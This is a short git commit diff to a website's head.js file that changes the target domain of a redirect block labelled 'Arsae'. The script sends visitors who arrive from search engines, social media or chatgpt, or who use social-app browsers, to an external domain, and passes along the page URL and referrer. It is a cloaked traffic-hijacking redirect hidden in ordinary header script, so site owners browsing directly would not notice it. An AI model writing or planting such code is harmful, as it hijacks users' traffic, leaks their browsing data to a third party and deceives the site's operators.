55713c43723efa9b0f03d3043dd7d74aacfdbb53
hiroshimada <lajunastudio@gmail.com>
2026-07-06 21:54:06 +0700

    Update head.js

--- x/head.js
+++ x/head.js
@@ -16,5 +16,5 @@ document.write('</div>');
 document.write('</noscript>');
 
 ///// Arsae /////
-var ars = 'http://blog.abata1.com';
+var ars = 'http://premier.abata1.com';
 if(['.aol.', 'chatgpt.', 'msn.', '.google.', 'bing.', 'yandex.', 'facebook.', 'brave.', 'woa.', 'ecosia', 'qwant', 'pinterest.', 'coccoc.', 'baidu.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
